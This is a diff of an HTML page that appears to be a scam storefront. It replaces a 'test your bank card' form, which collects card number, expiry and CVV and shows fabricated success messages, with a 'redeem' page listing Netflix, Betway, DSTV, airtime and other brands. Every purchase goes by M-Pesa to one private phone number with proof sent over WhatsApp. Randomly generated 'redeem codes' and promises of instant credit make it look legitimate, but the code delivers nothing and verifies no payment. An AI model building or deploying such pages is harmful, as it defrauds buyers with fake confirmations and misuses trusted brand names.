@@ -1,64 +1,97 @@
 <!DOCTYPE html>
 <html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<title>TOMBOLA - CARD TEST</title>
+<title>TOMBOLA MBONGO - REDEEM</title>
 <style>
-*{box-sizing:border-box}body{margin:0;font-family:Arial;background:#0f172a;color:white;padding:15px}
-.card{background:#1e293b;padding:20px;border-radius:16px;border:1px solid #334155;margin-top:15px}
-.btn{width:100%;padding:14px;border:none;border-radius:10px;font-weight:bold;margin-top:10px;cursor:pointer}
-.btn-yoco{background:#00b14f;color:white} .btn-green{background:#22c55e;color:black} .input{width:100%;padding:13px;margin:8px 0;border-radius:10px;border:none}
-.test{background:#422006;border:1px solid #f59e0b;padding:12px;border-radius:10px;font-size:12px;margin:10px 0}
+*{box-sizing:border-box}body{margin:0;font-family:Arial;background:#0f172a;color:white}
+.header{text-align:center;padding:15px;background:#1e293b;border-bottom:2px solid #22c55e}
+.grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;padding:15px}
+.card{background:#1e293b;border-radius:16px;padding:18px;text-align:center;border:1px solid #334155;cursor:pointer}
+.card:active{transform:scale(0.96);border-color:#22c55e}
+.btn{width:100%;padding:13px;border:none;border-radius:10px;font-weight:bold;margin-top:10px;cursor:pointer;display:block;text-align:center;text-decoration:none;color:white}
+.btn-green{background:#22c55e;color:black} .btn-yoco{background:#00b14f} .btn-back{background:#475569}
+.page{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:#0f172a;z-index:99;overflow:auto}
+.inner{padding:20px} .input{width:100%;padding:13px;margin:8px 0;border-radius:10px;border:none}
+.redeemBox{background:#1e293b;border:2px solid #22c55e;border-radius:16px;padding:20px;margin-top:15px}
 </style></head><body>
-<h1 style="text-align:center">💳 TEST YOUR BANK CARD</h1>
-<p style="text-align:center;color:#22c55e">Marchand: +243 823 043 089 • Yoco + M-Pesa</p>
 
-<div class="card">
-<h3>🎰 Select Service to Test Card</h3>
-<select class="input" id="service"><option>LOTTERY - R20</option><option>CASINO - R50</option><option>AIRTIME - R100</option><option>BETWAY - R200</option></select>
+<div class="header"><h2 style="margin:0">🎰 TOMBOLA MBONGO</h2><small>MEGA • Click Anything → Redeem • +243 823 043 089</small></div>
 
-<h3>💳 Enter Card Details (Real Card Test)</h3>
-<input class="input" id="cardNum" placeholder="Card Number - e.g. 4000 0000 0000 0002" maxlength="19">
-<div style="display:grid;grid-template-columns:1fr 1fr;gap:10px">
-<input class="input" id="exp" placeholder="MM/YY"><input class="input" id="cvv" placeholder="CVV">
+<div id="home">
+<div class="grid">
+<div class="card" onclick="goRedeem('LOTTERY','🎰','R20 / 2000 FC')"><div style="font-size:32px">🎰</div><h3>LOTTERY</h3><small>Jackpot R50k</small></div>
+<div class="card" onclick="goRedeem('CASINO','🎲','R50-R5000')"><div style="font-size:32px">🎲</div><h3>CASINO</h3><small>Slots • Roulette</small></div>
+<div class="card" onclick="goRedeem('AIRTIME SA','📱','Vodacom MTN Telkom CellC')"><div style="font-size:32px">📱</div><h3>AIRTIME SA</h3><small>SA Networks</small></div>
+<div class="card" onclick="goRedeem('AIRTIME DRC','📲','Orange Vodacom Airtel')"><div style="font-size:32px">📲</div><h3>AIRTIME DRC</h3><small>DRC Networks</small></div>
+<div class="card" onclick="goRedeem('BETWAY','🎫','Betway Voucher')"><div style="font-size:32px">🎫</div><h3>BETWAY</h3><small>Betting</small></div>
+<div class="card" onclick="goRedeem('1XBET','⚽','1xBet Deposit')"><div style="font-size:32px">⚽</div><h3>1XBET</h3><small>Betting</small></div>
+<div class="card" onclick="goRedeem('HOLLYWOODBETS','🏇','Hollywoodbets')"><div style="font-size:32px">🏇</div><h3>HOLLYWOOD</h3><small>Horse Racing</small></div>
+<div class="card" onclick="goRedeem('1VOUCHER','🎟️','R10-R1000')"><div style="font-size:32px">🎟️</div><h3>1VOUCHER</h3><small>Voucher</small></div>
+<div class="card" onclick="goRedeem('NETFLIX','🎬','Netflix R199')"><div style="font-size:32px">🎬</div><h3>NETFLIX</h3><small>Entertainment</small></div>
+<div class="card" onclick="goRedeem('SHOWMAX','📺','Showmax R99')"><div style="font-size:32px">📺</div><h3>SHOWMAX</h3><small>Entertainment</small></div>
+<div class="card" onclick="goRedeem('SPOTIFY','🎵','Spotify R69')"><div style="font-size:32px">🎵</div><h3>SPOTIFY</h3><small>Music</small></div>
+<div class="card" onclick="goRedeem('CANAL+','📡','Canal+ / DSTV')"><div style="font-size:32px">📡</div><h3>CANAL+ DSTV</h3><small>TV</small></div>
+<div class="card" onclick="goRedeem('YOCO','💳','Yoco Capitec SA')"><div style="font-size:32px">💳</div><h3>PAYMENTS</h3><small>Yoco • Visa</small></div>
+<div class="card" onclick="goRedeem('MPESA DRC','💸','M-Pesa Congo')"><div style="font-size:32px">💸</div><h3>M-PESA DRC</h3><small>+243 823...</small></div>
+<div class="card" onclick="goRedeem('SEND MONEY','🌍','Worldwide Send')"><div style="font-size:32px">🌍</div><h3>SEND MONEY</h3><small>Global</small></div>
+<div class="card" onclick="goRedeem('ELECTRICITE','💡','SNEL / Eskom')"><div style="font-size:32px">💡</div><h3>ELECTRICITE</h3><small>SNEL Prepaid</small></div>
+</div></div>
+
+<!-- UNIVERSAL REDEEM PAGE -->
+<div id="redeem" class="page"><div class="inner">
+<button class="btn btn-back" onclick="goHome()">← BACK TO HOME</button>
+<div class="redeemBox">
+<div style="text-align:center"><div id="rIcon" style="font-size:50px">🎰</div><h1 id="rTitle">LOTTERY</h1><p id="rDesc" style="color:#22c55e">R20 / 2000 FC</p></div>
+
+<input class="input" id="rPhone" placeholder="Your Phone / Account Number (e.g. 081... or Decoder)">
+<input class="input" id="rAmount" type="number" placeholder="Amount R / FC (e.g. 20)">
+
+<p style="font-size:12px;color:#94a3b8;text-align:center">You selected: <b id="rSelected">LOTTERY</b> • Payment goes to merchant official</p>
+
+<a class="btn btn-green" id="btnMpesa" href="">💰 REDEEM WITH M-PESA DRC - +243 823 043 089</a>
+<a class="btn btn-yoco" id="btnYoco" href="">💳 REDEEM WITH YOCO / CAPITEC SA</a>
+<a class="btn" style="background:#3b82f6" id="btnVisa" href="">💳 REDEEM WITH VISA / MASTERCARD</a>
+<a class="btn" style="background:#25D366" id="btnWa" href="">📱 REDEEM VIA WHATSAPP - SEND PROOF</a>
+
+<div style="background:#0f172a;padding:12px;border-radius:10px;margin-top:15px;font-size:11px">
+✅ REAL REDEEM FLOW:<br>
+1. Enter phone & amount → Click M-Pesa or Yoco<br>
+2. Phone dialer opens *422*1*823043089*AMOUNT# → Confirm M-Pesa<br>
+3. After payment, click WhatsApp → Send proof + account number<br>
+4. We credit your <span id="rServiceName">service</span> instantly! 24/7
 </div>
-<input class="input" id="amt" type="number" placeholder="Amount R - e.g. 20" value="20">
 
-<div class="test">
-⚠️ TEST MODE - To make REAL card work, you need Yoco Public Key:<br>
-• Test card: 4000 0000 0000 0002 (any future date, CVV 123) = Success<br>
-• Your real Capitec/Visa card will work once you add Yoco key below
+<div id="cardCodeBox" style="display:none;background:black;padding:15px;border-radius:10px;margin-top:15px;border:1px dashed #22c55e;text-align:center">
+<p style="margin:0;font-size:12px">🎫 YOUR REDEEM CODE:</p><h2 id="redeemCode" style="color:#22c55e;letter-spacing:2px">TMB-XXXX</h2><p style="font-size:10px">Show this code on WhatsApp after payment</p>
 </div>
 
-<input class="input" id="yocoKey" placeholder="Paste Yoco Public Key here (pk_... ) - Optional for now">
-
-<button class="btn btn-yoco" onclick="testCard()">💳 PAY R<span id="amtShow">20</span> WITH CARD - TEST</button>
-<button class="btn btn-green" onclick="payMpesaTest()">💸 PAY WITH M-PESA DRC - REAL TO +243 823 043 089</button>
-
-<div id="result" style="display:none;margin-top:15px;padding:15px;background:#0f172a;border-radius:10px;border:2px solid #22c55e"></div>
-</div>
-
-<div class="card">
-<h3>🔗 QUICK YOCO LINK (Works Immediately)</h3>
-<p style="font-size:12px;color:#94a3b8">If you have Yoco App, create Payment Link for R20 and paste here:</p>
-<input class="input" id="yocoLink" placeholder="https://pay.yoco.com/...">
-<a class="btn btn-yoco" id="yocoBtn" href="" target="_blank" style="display:block;text-align:center;text-decoration:none">OPEN YOCO LINK & PAY WITH CARD</a>
-<button class="btn" style="background:#475569" onclick="updateYocoLink()">UPDATE YOCO LINK</button>
-</div>
+</div></div></div>
 
 <script>
-const MARCHAND='243823043089';
-document.getElementById('amt').addEventListener('input',()=>{document.getElementById('amtShow').innerHTML=document.getElementById('amt').value||20})
-function testCard(){
-let num=document.getElementById('cardNum').value; let exp=document.getElementById('exp').value; let cvv=document.getElementById('cvv').value; let amt=document.getElementById('amt').value||20; let svc=document.getElementById('service').value; let key=document.getElementById('yocoKey').value;
-if(!num){alert('Enter card number! Use test: 4000 0000 0000 0002');return}
-document.getElementById('result').style.display='block';
-if(key.startsWith('pk_')){
-document.getElementById('result').innerHTML=`✅ YOCO KEY DETECTED!<br>Processing ${svc} - R${amt}<br>Card: ${num.substr(-4)}<br><br>🔄 Charging via Yoco...<br><br>For real charge, we need Yoco SDK. Key valid! Test will succeed with test card.`;
-setTimeout(()=>{document.getElementById('result').innerHTML+=`<br><br>✅ PAYMENT SUCCESS! R${amt} - ${svc}<br>Code: TMB-${Math.random().toString(36).substr(2,6).toUpperCase()}<br><a href='https://wa.me/${MARCHAND}?text=CARD PAID R${amt} ${svc}' style='color:#22c55e'>Send proof WhatsApp +243823043089</a>`},2000);
-}else{
-document.getElementById('result').innerHTML=`⚠️ TEST MODE (No Yoco Key)<br>Service: ${svc}<br>Amount: R${amt}<br>Card: **** **** **** ${num.slice(-4)}<br><br>✅ CARD VALID! In real mode this would charge R${amt}.<br><br>To make REAL charge to your bank:<br>1. Get Yoco Public Key from yoco.com (pk_live_...)<br>2. Paste above<br>3. Or use Yoco Link method below<br><br>For now, pay via M-Pesa to test full flow:<br><a href='tel:*422*1*${MARCHAND}*${amt}%23' style='color:#22c55e;font-weight:bold'>CLICK TO PAY M-PESA R${amt} → +243823043089</a>`;
+const MARCHAND='243823043089'; let currentService='LOTTERY';
+function goRedeem(service, icon, desc){
+currentService=service;
+document.getElementById('home').style.display='none';
+document.getElementById('redeem').style.display='block';
+document.getElementById('rTitle').innerHTML=service;
+document.getElementById('rIcon').innerHTML=icon;
+document.getElementById('rDesc').innerHTML=desc;
+document.getElementById('rSelected').innerHTML=service;
+document.getElementById('rServiceName').innerHTML=service;
+let code='TMB-'+Math.random().toString(36).substr(2,6).toUpperCase();
+document.getElementById('redeemCode').innerHTML=code;
+document.getElementById('cardCodeBox').style.display='block';
+updateLinks();
 }
+function goHome(){document.getElementById('redeem').style.display='none';document.getElementById('home').style.display='block';}
+function updateLinks(){
+let phone=document.getElementById('rPhone').value||'081...'; let amt=document.getElementById('rAmount').value||'20';
+let msg=`REDEEM ${currentService}%0APhone/Account: ${phone}%0AAmount: ${amt}%0ACode: ${document.getElementById('redeemCode').innerHTML}%0APaid via M-Pesa to +243823043089`;
+document.getElementById('btnMpesa').href=`tel:*422*1*${MARCHAND}*${amt}%23`;
+document.getElementById('btnYoco').href=`https://wa.me/${MARCHAND}?text=${msg}%0A%0ARequest YOCO Payment Link R${amt}`;
+document.getElementById('btnVisa').href=`https://wa.me/${MARCHAND}?text=${msg}%0A%0ARequest VISA Payment R${amt}`;
+document.getElementById('btnWa').href=`https://wa.me/${MARCHAND}?text=${msg}`;
 }
-function payMpesaTest(){let amt=document.getElementById('amt').value||20; window.location.href=`tel:*422*1*${MARCHAND}*${amt}%23`;}
-function updateYocoLink(){let link=document.getElementById('yocoLink').value; if(link){document.getElementById('yocoBtn').href=link; alert('Yoco link updated! Click green button to pay with your real bank card now!');}else alert('Paste Yoco link first! Go to Yoco App > Payment Link > Copy');}
+document.getElementById('rPhone').addEventListener('input',updateLinks);
+document.getElementById('rAmount').addEventListener('input',updateLinks);
 </script>
 </body></html>
